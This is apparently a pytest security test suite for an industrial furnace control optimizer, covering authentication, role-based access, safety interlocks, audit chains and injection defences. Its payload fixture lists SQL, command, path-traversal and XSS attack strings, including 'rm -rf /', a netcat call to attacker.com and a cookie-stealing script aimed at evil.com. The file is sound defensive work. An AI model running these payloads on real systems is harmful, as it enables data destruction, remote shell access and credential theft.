# -*- coding: utf-8 -*-
"""
Security Validation Tests for GL-007 FURNACEPULSE (FurnacePerformanceOptimizer)

This module provides comprehensive security tests covering:
- Input validation and sanitization
- Injection attack prevention (SQL, command, path traversal)
- Authentication and authorization
- Role-based access control (RBAC)
- Furnace safety interlock security (NFPA 86)
- Audit trail integrity and provenance
- Rate limiting and DoS prevention
- Data protection and encryption
- Control command authentication
- Emergency shutdown security

Security Requirements:
- OWASP Top 10 Compliance
- IEC 62443 Industrial Security
- NIST Cybersecurity Framework
- NFPA 86 Industrial Furnace Safety
- API 556 Fired Heater Safety Requirements
- PSM (Process Safety Management) 29 CFR 1910.119

Safety Criticality:
Furnace control systems are safety-critical. Unauthorized access or malicious
commands could result in:
- Equipment damage (>$1M per incident)
- Fire/explosion hazards
- Personnel injury
- Environmental violations

Author: GL-BackendDeveloper
Date: 2025-11-22
Version: 1.0.0
"""

import pytest
import json
import re
import hashlib
import time
import sys
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field
from pathlib import Path
from decimal import Decimal

# Add parent path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))


# ============================================================================
# SECURITY TEST INFRASTRUCTURE
# ============================================================================

@dataclass
class MockSecurityContext:
    """Mock security context for testing."""
    user_id: str = "test_user"
    role: str = "operator"
    authenticated: bool = True
    session_id: str = "session_12345"
    ip_address: str = "192.168.1.100"
    permissions: List[str] = field(default_factory=list)
    two_factor_verified: bool = False


@dataclass
class MockAuthProvider:
    """Mock authentication provider for furnace access."""
    valid_credentials: Dict[str, tuple] = field(default_factory=dict)
    sessions: Dict[str, Dict] = field(default_factory=dict)
    failed_attempts: Dict[str, int] = field(default_factory=dict)
    lockout_threshold: int = 3  # Stricter for safety-critical systems
    lockout_duration_seconds: int = 600

    def __post_init__(self):
        self.valid_credentials = {
            "operator": ("op_password_123", "operator"),
            "engineer": ("eng_password_456", "engineer"),
            "supervisor": ("sup_password_789", "supervisor"),
            "admin": ("admin_password_012", "admin"),
            "safety_officer": ("safety_password_345", "safety_officer")
        }

    def authenticate(self, username: str, password: str) -> Dict[str, Any]:
        """Authenticate user credentials."""
        # Check lockout
        if self.is_locked_out(username):
            return {"success": False, "error": "Account locked - contact safety officer"}

        if username in self.valid_credentials:
            stored_password, role = self.valid_credentials[username]
            if stored_password == password:
                session_id = f"session_{username}_{int(time.time())}"
                self.sessions[session_id] = {
                    "user": username,
                    "role": role,
                    "created_at": time.time(),
                    "two_factor_verified": False
                }
                self.failed_attempts[username] = 0
                return {"success": True, "session_id": session_id, "role": role}

        # Track failed attempt
        self.failed_attempts[username] = self.failed_attempts.get(username, 0) + 1
        return {"success": False, "error": "Invalid credentials"}

    def is_locked_out(self, username: str) -> bool:
        """Check if user is locked out."""
        return self.failed_attempts.get(username, 0) >= self.lockout_threshold

    def check_permission(self, session_id: str, action: str) -> bool:
        """Check if session has permission for action."""
        if session_id not in self.sessions:
            return False

        role = self.sessions[session_id]["role"]
        permissions = {
            "operator": ["read_data", "view_dashboard", "acknowledge_alarm"],
            "engineer": ["read_data", "view_dashboard", "acknowledge_alarm",
                         "modify_setpoints", "run_optimization", "view_audit"],
            "supervisor": ["read_data", "view_dashboard", "acknowledge_alarm",
                           "modify_setpoints", "run_optimization", "view_audit",
                           "bypass_interlock", "emergency_shutdown"],
            "admin": ["read_data", "view_dashboard", "acknowledge_alarm",
                      "modify_setpoints", "run_optimization", "view_audit",
                      "bypass_interlock", "emergency_shutdown",
                      "modify_config", "manage_users"],
            "safety_officer": ["read_data", "view_dashboard", "view_audit",
                               "bypass_interlock", "emergency_shutdown",
                               "safety_override"]
        }

        return action in permissions.get(role, [])

    def require_two_factor(self, session_id: str, action: str) -> bool:
        """Check if action requires two-factor authentication."""
        critical_actions = [
            "bypass_interlock",
            "emergency_shutdown",
            "modify_config",
            "safety_override"
        ]
        return action in critical_actions


@dataclass
class MockFurnaceSafetyController:
    """Mock furnace safety controller per NFPA 86."""
    interlocks_active: bool = True
    emergency_stop_triggered: bool = False
    bypass_authorized: bool = False
    purge_completed: bool = False

    # Temperature limits per NFPA 86
    max_furnace_temp_c: float = 1200.0
    max_flue_gas_temp_c: float = 500.0
    max_skin_temp_c: float = 350.0

    # Pressure limits
    max_chamber_pressure_mbar: float = 10.0
    min_chamber_pressure_mbar: float = -10.0

    # Combustion limits
    min_combustion_air_percent: float = 10.0
    max_fuel_pressure_mbar: float = 500.0

    alarm_history: List[Dict] = field(default_factory=list)
    interlock_status: Dict[str, str] = field(default_factory=dict)

    def __post_init__(self):
        self.interlock_status = {
            "HIGH_TEMP": "normal",
            "HIGH_PRESSURE": "normal",
            "LOW_AIR": "normal",
            "FLAME_FAILURE": "normal",
            "FUEL_PRESSURE": "normal",
            "PURGE_INCOMPLETE": "normal"
        }

    def check_temperature_limit(self, current_temp: float, zone: str) -> Dict[str, Any]:
        """Check temperature against safety limits."""
        result = {"safe": True, "action": None}

        max_temp = self.max_furnace_temp_c
        if zone == "flue_gas":
            max_temp = self.max_flue_gas_temp_c
        elif zone == "skin":
            max_temp = self.max_skin_temp_c

        if current_temp >= max_temp * 1.1:  # 110% = emergency
            result = {
                "safe": False,
                "action": "EMERGENCY_SHUTDOWN",
                "message": f"Temperature {current_temp}C exceeds emergency limit"
            }
            self.trigger_emergency_stop(f"HIGH_TEMP_{zone}")
        elif current_temp >= max_temp:  # 100% = alarm
            result = {
                "safe": False,
                "action": "ALARM",
                "message": f"Temperature {current_temp}C exceeds limit"
            }
            self.interlock_status["HIGH_TEMP"] = "alarm"

        return result

    def trigger_emergency_stop(self, reason: str):
        """Trigger emergency furnace shutdown per NFPA 86."""
        self.emergency_stop_triggered = True
        self.alarm_history.append({
            "type": "EMERGENCY_SHUTDOWN",
            "reason": reason,
            "timestamp": time.time()
        })

    def bypass_interlock(self, interlock_id: str, auth_code: str, user: str) -> Dict[str, Any]:
        """
        Attempt to bypass safety interlock with proper authorization.

        Per NFPA 86, interlock bypasses require:
        1. Supervisor or safety officer authorization
        2. Documented reason
        3. Automatic expiration (max 8 hours)
        """
        valid_codes = {
            "SUPERVISOR_BYPASS_2024": 8 * 3600,  # 8 hour maximum
            "SAFETY_OFFICER_BYPASS_2024": 4 * 3600,  # 4 hour maximum
        }

        if auth_code not in valid_codes:
            return {
                "success": False,
                "error": "Invalid authorization code"
            }

        # Log the bypass for audit
        self.alarm_history.append({
            "type": "INTERLOCK_BYPASS",
            "interlock_id": interlock_id,
            "user": user,
            "authorization_code": auth_code[:8] + "****",  # Mask code
            "duration_seconds": valid_codes[auth_code],
            "timestamp": time.time()
        })

        self.bypass_authorized = True
        return {
            "success": True,
            "expires_in_seconds": valid_codes[auth_code],
            "interlock_id": interlock_id
        }


# ============================================================================
# FIXTURES
# ============================================================================

@pytest.fixture
def security_context():
    """Create mock security context."""
    return MockSecurityContext(
        permissions=["read_data", "view_dashboard"]
    )


@pytest.fixture
def auth_provider():
    """Create mock auth provider."""
    return MockAuthProvider()


@pytest.fixture
def furnace_safety():
    """Create mock furnace safety controller."""
    return MockFurnaceSafetyController()


@pytest.fixture
def injection_payloads():
    """Create injection attack payloads for testing."""
    return {
        "sql_injection": [
            "'; DROP TABLE furnace_data; --",
            "1 OR 1=1",
            "admin'--",
            "1; DELETE FROM audit_log WHERE 1=1; --",
            "' UNION SELECT * FROM control_setpoints --",
            "1' AND '1'='1",
        ],
        "command_injection": [
            "; rm -rf /",
            "| shutdown -h now",
            "$(reboot)",
            "`systemctl stop furnace`",
            "&& fuel_valve_open",
            "| nc attacker.com 4444",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "/etc/shadow",
            "....//....//config/safety_limits.json",
            "%2e%2e%2f%2e%2e%2f",
        ],
        "xss_payloads": [
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "'><script>document.location='http://evil.com/steal?'+document.cookie</script>",
        ]
    }


@pytest.fixture
def valid_furnace_setpoint():
    """Create valid furnace setpoint data."""
    return {
        "parameter": "air_fuel_ratio",
        "value": 15.0,
        "units": "ratio",
        "ramp_rate": 1.0,
        "authorization": "engineer_auth_token"
    }


# ============================================================================
# INPUT VALIDATION TESTS
# ============================================================================

@pytest.mark.security
class TestInputValidation:
    """Test input validation and sanitization."""

    @pytest.mark.security
    def test_reject_sql_injection(self, injection_payloads):
        """Test SQL injection payloads are rejected."""
        valid_pattern = re.compile(r'^[a-zA-Z][a-zA-Z0-9_-]{0,63}$')

        for payload in injection_payloads["sql_injection"]:
            assert not valid_pattern.match(payload), f"SQL injection not rejected: {payload}"

    @pytest.mark.security
    def test_reject_command_injection(self, injection_payloads):
        """Test command injection payloads are rejected."""
        safe_pattern = re.compile(r'^[a-zA-Z][a-zA-Z0-9_-]*$')

        for payload in injection_payloads["command_injection"]:
            assert not safe_pattern.match(payload), f"Command injection not rejected: {payload}"

    @pytest.mark.security
    def test_reject_path_traversal(self, injection_payloads):
        """Test path traversal payloads are rejected."""
        def is_safe_path(path: str) -> bool:
            dangerous_patterns = ["..", "//", "\\\\", "%2e", "%2f"]
            return not any(p in path.lower() for p in dangerous_patterns)

        for payload in injection_payloads["path_traversal"]:
            assert not is_safe_path(payload), f"Path traversal not rejected: {payload}"

    @pytest.mark.security
    def test_furnace_temperature_bounds(self):
        """Test temperature setpoints are within valid bounds."""
        def validate_temperature(temp_c: float, zone: str) -> bool:
            limits = {
                "furnace": (0.0, 1300.0),
                "flue_gas": (0.0, 600.0),
                "skin": (0.0, 400.0)
            }
            min_t, max_t = limits.get(zone, (0.0, 1300.0))
            return min_t <= temp_c <= max_t and temp_c == temp_c  # NaN check

        # Valid temperatures
        assert validate_temperature(950.0, "furnace")
        assert validate_temperature(280.0, "flue_gas")
        assert validate_temperature(180.0, "skin")

        # Invalid temperatures
        assert not validate_temperature(1500.0, "furnace")  # Too high
        assert not validate_temperature(-50.0, "furnace")   # Below zero
        assert not validate_temperature(float('nan'), "furnace")
        assert not validate_temperature(float('inf'), "furnace")

    @pytest.mark.security
    def test_air_fuel_ratio_bounds(self):
        """Test air/fuel ratio setpoints are within safe bounds."""
        def validate_air_fuel_ratio(ratio: float) -> bool:
            # Natural gas: safe range 10.0 - 25.0 per API 556
            return 10.0 <= ratio <= 25.0 and ratio == ratio

        assert validate_air_fuel_ratio(15.0)
        assert validate_air_fuel_ratio(17.2)  # Stoichiometric
        assert validate_air_fuel_ratio(10.0)  # Lower bound
        assert validate_air_fuel_ratio(25.0)  # Upper bound

        assert not validate_air_fuel_ratio(5.0)   # Too low - incomplete combustion
        assert not validate_air_fuel_ratio(30.0)  # Too high - excessive air
        assert not validate_air_fuel_ratio(float('nan'))

    @pytest.mark.security
    def test_pressure_bounds(self):
        """Test pressure setpoints are within safe bounds."""
        def validate_pressure(pressure_mbar: float) -> bool:
            return -20.0 <= pressure_mbar <= 50.0 and pressure_mbar == pressure_mbar

        assert validate_pressure(0.0)
        assert validate_pressure(-5.0)  # Slight vacuum
        assert validate_pressure(10.0)

        assert not validate_pressure(-50.0)  # Dangerous vacuum
        assert not validate_pressure(100.0)  # Over-pressure
        assert not validate_pressure(float('inf'))


# ============================================================================
# AUTHENTICATION TESTS
# ============================================================================

@pytest.mark.security
class TestAuthentication:
    """Test authentication security for furnace access."""

    @pytest.mark.security
    def test_valid_credentials_succeed(self, auth_provider):
        """Test valid credentials allow authentication."""
        result = auth_provider.authenticate("operator", "op_password_123")

        assert result["success"]
        assert "session_id" in result
        assert result["role"] == "operator"

    @pytest.mark.security
    def test_invalid_password_rejected(self, auth_provider):
        """Test invalid password is rejected."""
        result = auth_provider.authenticate("operator", "wrong_password")

        assert not result["success"]
        assert "error" in result

    @pytest.mark.security
    def test_unknown_user_rejected(self, auth_provider):
        """Test unknown username is rejected."""
        result = auth_provider.authenticate("unknown_user", "any_password")

        assert not result["success"]

    @pytest.mark.security
    def test_account_lockout_after_failed_attempts(self, auth_provider):
        """Test account lockout after multiple failed attempts (stricter for safety systems)."""
        # Make failed attempts (only 3 allowed for safety-critical systems)
        for _ in range(auth_provider.lockout_threshold):
            auth_provider.authenticate("operator", "wrong_password")

        # Should now be locked out
        assert auth_provider.is_locked_out("operator")

        # Even correct password should fail
        result = auth_provider.authenticate("operator", "op_password_123")
        assert not result["success"]
        assert "locked" in result["error"].lower()

    @pytest.mark.security
    def test_two_factor_required_for_critical_actions(self, auth_provider):
        """Test two-factor authentication required for critical actions."""
        result = auth_provider.authenticate("supervisor", "sup_password_789")
        session_id = result["session_id"]

        # Critical actions require 2FA
        assert auth_provider.require_two_factor(session_id, "bypass_interlock")
        assert auth_provider.require_two_factor(session_id, "emergency_shutdown")
        assert auth_provider.require_two_factor(session_id, "safety_override")

        # Non-critical actions don't require 2FA
        assert not auth_provider.require_two_factor(session_id, "read_data")
        assert not auth_provider.require_two_factor(session_id, "view_dashboard")


# ============================================================================
# AUTHORIZATION TESTS
# ============================================================================

@pytest.mark.security
class TestAuthorization:
    """Test authorization and RBAC for furnace control."""

    @pytest.mark.security
    def test_operator_limited_access(self, auth_provider):
        """Test operator role has limited access."""
        result = auth_provider.authenticate("operator", "op_password_123")
        session_id = result["session_id"]

        # Allowed actions
        assert auth_provider.check_permission(session_id, "read_data")
        assert auth_provider.check_permission(session_id, "view_dashboard")
        assert auth_provider.check_permission(session_id, "acknowledge_alarm")

        # Denied actions - cannot modify control settings
        assert not auth_provider.check_permission(session_id, "modify_setpoints")
        assert not auth_provider.check_permission(session_id, "run_optimization")
        assert not auth_provider.check_permission(session_id, "bypass_interlock")
        assert not auth_provider.check_permission(session_id, "emergency_shutdown")

    @pytest.mark.security
    def test_engineer_control_access(self, auth_provider):
        """Test engineer role can modify settings but not safety controls."""
        result = auth_provider.authenticate("engineer", "eng_password_456")
        session_id = result["session_id"]

        # Allowed actions
        assert auth_provider.check_permission(session_id, "read_data")
        assert auth_provider.check_permission(session_id, "modify_setpoints")
        assert auth_provider.check_permission(session_id, "run_optimization")
        assert auth_provider.check_permission(session_id, "view_audit")

        # Denied actions - cannot override safety
        assert not auth_provider.check_permission(session_id, "bypass_interlock")
        assert not auth_provider.check_permission(session_id, "emergency_shutdown")
        assert not auth_provider.check_permission(session_id, "manage_users")

    @pytest.mark.security
    def test_supervisor_safety_access(self, auth_provider):
        """Test supervisor role has safety control access."""
        result = auth_provider.authenticate("supervisor", "sup_password_789")
        session_id = result["session_id"]

        # Allowed actions including safety controls
        assert auth_provider.check_permission(session_id, "modify_setpoints")
        assert auth_provider.check_permission(session_id, "bypass_interlock")
        assert auth_provider.check_permission(session_id, "emergency_shutdown")

        # Denied actions
        assert not auth_provider.check_permission(session_id, "manage_users")

    @pytest.mark.security
    def test_safety_officer_override_access(self, auth_provider):
        """Test safety officer has safety override capability."""
        result = auth_provider.authenticate("safety_officer", "safety_password_345")
        session_id = result["session_id"]

        # Safety-specific permissions
        assert auth_provider.check_permission(session_id, "bypass_interlock")
        assert auth_provider.check_permission(session_id, "emergency_shutdown")
        assert auth_provider.check_permission(session_id, "safety_override")
        assert auth_provider.check_permission(session_id, "view_audit")

        # Cannot modify operational settings
        assert not auth_provider.check_permission(session_id, "modify_setpoints")

    @pytest.mark.security
    def test_invalid_session_denied(self, auth_provider):
        """Test invalid session is denied all actions."""
        invalid_session = "invalid_session_12345"

        assert not auth_provider.check_permission(invalid_session, "read_data")
        assert not auth_provider.check_permission(invalid_session, "view_dashboard")
        assert not auth_provider.check_permission(invalid_session, "emergency_shutdown")


# ============================================================================
# SAFETY INTERLOCK TESTS
# ============================================================================

@pytest.mark.security
class TestSafetyInterlocks:
    """Test furnace safety interlock security per NFPA 86."""

    @pytest.mark.security
    def test_high_temperature_triggers_alarm(self, furnace_safety):
        """Test high temperature triggers alarm."""
        result = furnace_safety.check_temperature_limit(1250.0, "furnace")

        assert not result["safe"]
        assert result["action"] == "ALARM"

    @pytest.mark.security
    def test_extreme_temperature_triggers_emergency_shutdown(self, furnace_safety):
        """Test extreme temperature triggers emergency shutdown."""
        result = furnace_safety.check_temperature_limit(1350.0, "furnace")  # 110% of limit

        assert not result["safe"]
        assert result["action"] == "EMERGENCY_SHUTDOWN"
        assert furnace_safety.emergency_stop_triggered

    @pytest.mark.security
    def test_normal_temperature_safe(self, furnace_safety):
        """Test normal temperature is safe."""
        result = furnace_safety.check_temperature_limit(950.0, "furnace")

        assert result["safe"]
        assert result["action"] is None

    @pytest.mark.security
    def test_interlock_bypass_requires_authorization(self, furnace_safety):
        """Test interlock bypass requires proper authorization."""
        # Unauthorized bypass fails
        result = furnace_safety.bypass_interlock(
            "HIGH_TEMP",
            "invalid_code",
            "engineer"
        )
        assert not result["success"]
        assert not furnace_safety.bypass_authorized

        # Authorized bypass succeeds
        result = furnace_safety.bypass_interlock(
            "HIGH_TEMP",
            "SUPERVISOR_BYPASS_2024",
            "supervisor"
        )
        assert result["success"]
        assert furnace_safety.bypass_authorized
        assert result["expires_in_seconds"] == 8 * 3600  # Max 8 hours per NFPA 86

    @pytest.mark.security
    def test_interlock_bypass_logged_to_audit(self, furnace_safety):
        """Test interlock bypass is logged to audit trail."""
        furnace_safety.bypass_interlock(
            "HIGH_TEMP",
            "SUPERVISOR_BYPASS_2024",
            "supervisor"
        )

        # Check audit log
        assert len(furnace_safety.alarm_history) > 0
        bypass_entry = furnace_safety.alarm_history[-1]
        assert bypass_entry["type"] == "INTERLOCK_BYPASS"
        assert bypass_entry["interlock_id"] == "HIGH_TEMP"
        assert bypass_entry["user"] == "supervisor"
        assert "****" in bypass_entry["authorization_code"]  # Code is masked

    @pytest.mark.security
    def test_emergency_stop_cannot_be_disabled_remotely(self, furnace_safety):
        """Test emergency stop cannot be disabled remotely."""
        # Trigger emergency stop
        furnace_safety.trigger_emergency_stop("HIGH_TEMP_furnace")

        # Verify it's triggered
        assert furnace_safety.emergency_stop_triggered

        # Verify it's logged
        assert len(furnace_safety.alarm_history) > 0
        assert furnace_safety.alarm_history[-1]["type"] == "EMERGENCY_SHUTDOWN"


# ============================================================================
# DATA PROTECTION TESTS
# ============================================================================

@pytest.mark.security
class TestDataProtection:
    """Test data protection and privacy."""

    @pytest.mark.security
    def test_no_secrets_in_logs(self):
        """Test secrets are not exposed in logs."""
        log_message = "User supervisor logged in with session_id=abc123"

        sensitive_terms = ["password", "secret", "key", "token", "credential"]
        log_lower = log_message.lower()

        for term in sensitive_terms:
            assert term not in log_lower, f"Sensitive term '{term}' found in log"

    @pytest.mark.security
    def test_password_not_stored_plaintext(self):
        """Test passwords are hashed before storage."""
        password = "test_password_123"
        hashed = hashlib.sha256(password.encode()).hexdigest()

        assert password != hashed
        assert len(hashed) == 64  # SHA-256 hex length

    @pytest.mark.security
    def test_sensitive_data_masked_in_output(self):
        """Test sensitive data is masked in output."""
        def mask_sensitive(data: Dict) -> Dict:
            sensitive_fields = ["password", "api_key", "secret", "authorization_code"]
            masked = data.copy()

            for field in sensitive_fields:
                if field in masked:
                    masked[field] = "***MASKED***"

            return masked

        data = {
            "username": "engineer",
            "password": "eng_password_456",
            "authorization_code": "AUTH_CODE_123"
        }

        masked = mask_sensitive(data)

        assert masked["username"] == "engineer"
        assert masked["password"] == "***MASKED***"
        assert masked["authorization_code"] == "***MASKED***"

    @pytest.mark.security
    def test_control_setpoints_include_provenance(self, valid_furnace_setpoint):
        """Test control setpoints include provenance hash."""
        def create_setpoint_with_provenance(setpoint: Dict) -> Dict:
            setpoint_copy = setpoint.copy()
            provenance_data = f"{setpoint['parameter']}:{setpoint['value']}:{time.time()}"
            setpoint_copy['provenance_hash'] = hashlib.sha256(
                provenance_data.encode()
            ).hexdigest()
            return setpoint_copy

        result = create_setpoint_with_provenance(valid_furnace_setpoint)

        assert 'provenance_hash' in result
        assert len(result['provenance_hash']) == 64


# ============================================================================
# AUDIT TRAIL TESTS
# ============================================================================

@pytest.mark.security
class TestAuditTrail:
    """Test audit trail security and integrity."""

    @pytest.mark.security
    def test_control_actions_logged(self, furnace_safety):
        """Test control actions are logged."""
        furnace_safety.trigger_emergency_stop("TEST_TRIGGER")

        assert len(furnace_safety.alarm_history) > 0
        assert furnace_safety.alarm_history[-1]["type"] == "EMERGENCY_SHUTDOWN"
        assert "timestamp" in furnace_safety.alarm_history[-1]

    @pytest.mark.security
    def test_audit_entry_immutability(self):
        """Test audit entries cannot be modified after creation."""
        audit_log = []

        def add_audit_entry(action: str, user: str, details: str) -> Dict:
            entry = {
                "action": action,
                "user": user,
                "details": details,
                "timestamp": time.time(),
            }
            # Create hash to detect tampering
            entry["hash"] = hashlib.sha256(
                json.dumps({k: v for k, v in entry.items() if k != "hash"},
                           sort_keys=True).encode()
            ).hexdigest()
            audit_log.append(entry)
            return entry

        entry = add_audit_entry("modify_setpoint", "engineer", "air_fuel_ratio=15.0")

        # Verify hash
        computed_hash = hashlib.sha256(
            json.dumps({k: v for k, v in entry.items() if k != "hash"},
                       sort_keys=True).encode()
        ).hexdigest()

        assert entry["hash"] == computed_hash

    @pytest.mark.security
    def test_audit_trail_chain_integrity(self):
        """Test audit trail maintains blockchain-like chain integrity."""
        chain = []

        def add_to_chain(action: str, user: str) -> Dict:
            prev_hash = chain[-1]["hash"] if chain else "GENESIS"
            entry = {
                "action": action,
                "user": user,
                "previous_hash": prev_hash,
                "timestamp": time.time()
            }
            entry["hash"] = hashlib.sha256(
                json.dumps(entry, sort_keys=True).encode()
            ).hexdigest()
            chain.append(entry)
            return entry

        add_to_chain("system_startup", "system")
        add_to_chain("engineer_login", "engineer")
        add_to_chain("modify_air_fuel_ratio", "engineer")
        add_to_chain("alarm_acknowledged", "operator")

        # Verify chain integrity
        for i in range(1, len(chain)):
            assert chain[i]["previous_hash"] == chain[i-1]["hash"]


# ============================================================================
# RATE LIMITING TESTS
# ============================================================================

@pytest.mark.security
class TestRateLimiting:
    """Test rate limiting for DoS prevention."""

    @pytest.mark.security
    def test_request_rate_limiting(self):
        """Test request rate limiting is enforced."""
        class RateLimiter:
            def __init__(self, max_requests: int, window_seconds: float):
                self.max_requests = max_requests
                self.window_seconds = window_seconds
                self.requests: List[float] = []

            def is_allowed(self) -> bool:
                now = time.time()
                self.requests = [r for r in self.requests if now - r < self.window_seconds]

                if len(self.requests) >= self.max_requests:
                    return False

                self.requests.append(now)
                return True

        limiter = RateLimiter(max_requests=10, window_seconds=1.0)

        # First 10 requests should succeed
        for _ in range(10):
            assert limiter.is_allowed()

        # 11th request should be rate limited
        assert not limiter.is_allowed()

    @pytest.mark.security
    def test_setpoint_change_rate_limiting(self):
        """Test setpoint change frequency is limited for safety."""
        class SetpointLimiter:
            def __init__(self, min_interval_seconds: float):
                self.min_interval = min_interval_seconds
                self.last_change: Optional[float] = None

            def can_change(self) -> bool:
                if self.last_change is None:
                    return True
                return time.time() - self.last_change >= self.min_interval

            def record_change(self):
                self.last_change = time.time()

        # Minimum 5 second interval between setpoint changes
        limiter = SetpointLimiter(min_interval_seconds=0.1)

        assert limiter.can_change()
        limiter.record_change()
        assert not limiter.can_change()  # Too soon

        time.sleep(0.15)
        assert limiter.can_change()  # Enough time passed


# ============================================================================
# ENCRYPTION TESTS
# ============================================================================

@pytest.mark.security
class TestEncryption:
    """Test data encryption."""

    @pytest.mark.security
    def test_hash_algorithm_strength(self):
        """Test using SHA-256 for hashing."""
        data = "sensitive_furnace_data_12345"
        hash_val = hashlib.sha256(data.encode()).hexdigest()

        assert len(hash_val) == 64  # SHA-256 produces 64 character hex

        # Hash should be different for different inputs
        hash_val2 = hashlib.sha256("different_data".encode()).hexdigest()
        assert hash_val != hash_val2

    @pytest.mark.security
    def test_provenance_hash_security(self):
        """Test provenance hash provides integrity verification."""
        data = {
            "setpoint": "air_fuel_ratio",
            "value": 15.0,
            "timestamp": "2024-01-01T00:00:00Z",
            "user": "engineer"
        }

        original_hash = hashlib.sha256(
            json.dumps(data, sort_keys=True).encode()
        ).hexdigest()

        # Tamper with data
        data["value"] = 20.0
        tampered_hash = hashlib.sha256(
            json.dumps(data, sort_keys=True).encode()
        ).hexdigest()

        # Tampering detected
        assert original_hash != tampered_hash


# ============================================================================
# XSS PREVENTION TESTS
# ============================================================================

@pytest.mark.security
class TestXSSPrevention:
    """Test XSS attack prevention."""

    @pytest.mark.security
    def test_html_encoding(self, injection_payloads):
        """Test HTML special characters are encoded."""
        def html_encode(value: str) -> str:
            return (value
                    .replace("&", "&amp;")
                    .replace("<", "&lt;")
                    .replace(">", "&gt;")
                    .replace('"', "&quot;")
                    .replace("'", "&#x27;"))

        for payload in injection_payloads["xss_payloads"]:
            encoded = html_encode(payload)
            assert "<script>" not in encoded
            assert "javascript:" not in encoded
            assert "onerror=" not in encoded


# ============================================================================
# CONTROL COMMAND SECURITY TESTS
# ============================================================================

@pytest.mark.security
class TestControlCommandSecurity:
    """Test security of control commands."""

    @pytest.mark.security
    def test_setpoint_requires_authentication(self, auth_provider, valid_furnace_setpoint):
        """Test setpoint changes require authentication."""
        # Unauthenticated request should fail
        def send_setpoint(session_id: Optional[str], setpoint: Dict) -> Dict:
            if session_id is None or session_id not in auth_provider.sessions:
                return {"success": False, "error": "Authentication required"}

            if not auth_provider.check_permission(session_id, "modify_setpoints"):
                return {"success": False, "error": "Permission denied"}

            return {"success": True}

        # No session - fails
        result = send_setpoint(None, valid_furnace_setpoint)
        assert not result["success"]

        # Invalid session - fails
        result = send_setpoint("invalid_session", valid_furnace_setpoint)
        assert not result["success"]

        # Valid engineer session - succeeds
        auth_result = auth_provider.authenticate("engineer", "eng_password_456")
        result = send_setpoint(auth_result["session_id"], valid_furnace_setpoint)
        assert result["success"]

    @pytest.mark.security
    def test_emergency_shutdown_requires_authorization(self, auth_provider):
        """Test emergency shutdown requires supervisor or higher."""
        def emergency_shutdown(session_id: str) -> Dict:
            if not auth_provider.check_permission(session_id, "emergency_shutdown"):
                return {"success": False, "error": "Not authorized for emergency shutdown"}
            return {"success": True, "action": "EMERGENCY_SHUTDOWN_INITIATED"}

        # Operator cannot trigger emergency shutdown
        op_result = auth_provider.authenticate("operator", "op_password_123")
        result = emergency_shutdown(op_result["session_id"])
        assert not result["success"]

        # Engineer cannot trigger emergency shutdown
        eng_result = auth_provider.authenticate("engineer", "eng_password_456")
        result = emergency_shutdown(eng_result["session_id"])
        assert not result["success"]

        # Supervisor can trigger emergency shutdown
        sup_result = auth_provider.authenticate("supervisor", "sup_password_789")
        result = emergency_shutdown(sup_result["session_id"])
        assert result["success"]


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short", "-m", "security"])
